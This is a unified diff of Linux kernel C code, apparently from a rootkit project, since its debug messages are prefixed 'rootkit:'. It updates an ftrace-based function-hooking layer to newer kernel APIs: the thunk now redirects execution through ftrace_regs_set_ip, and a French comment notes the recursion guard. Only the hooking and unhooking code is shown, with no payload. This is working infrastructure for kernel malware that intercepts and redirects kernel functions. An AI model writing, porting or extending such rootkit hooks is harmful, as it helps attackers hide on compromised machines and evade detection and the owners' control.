@@ -3,14 +3,20 @@
 #include <linux/kallsyms.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/ftrace.h>
+
+
 
 static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-                                 struct ftrace_ops *ops, struct pt_regs *regs)
+                                 struct ftrace_ops *ops, struct ftrace_regs *fregs)
 {
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
+    // Éviter la récursion, on ne modifie l'IP que si le parent n'est pas dans notre module
     if (!within_module(parent_ip, THIS_MODULE)) {
-        regs->ip = (unsigned long)hook->function;
+        ftrace_regs_set_ip(fregs, (unsigned long)hook->function);
     }
 }
 
@@ -69,16 +75,13 @@ int install_hooks(struct ftrace_hook *hooks, size_t count) {
 
 void remove_hook(struct ftrace_hook *hook) {
     int err;
-
     err = unregister_ftrace_function(&hook->ops);
-    if (err) {
+    if (err)
         pr_debug("rootkit: unregister_ftrace_function failed: %d\n", err);
-    }
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if (err) {
+    if (err)
         pr_debug("rootkit: ftrace_set_filter_ip failed: %d\n", err);
-    }
 }
 
 void remove_hooks(struct ftrace_hook *hooks, size_t count) {
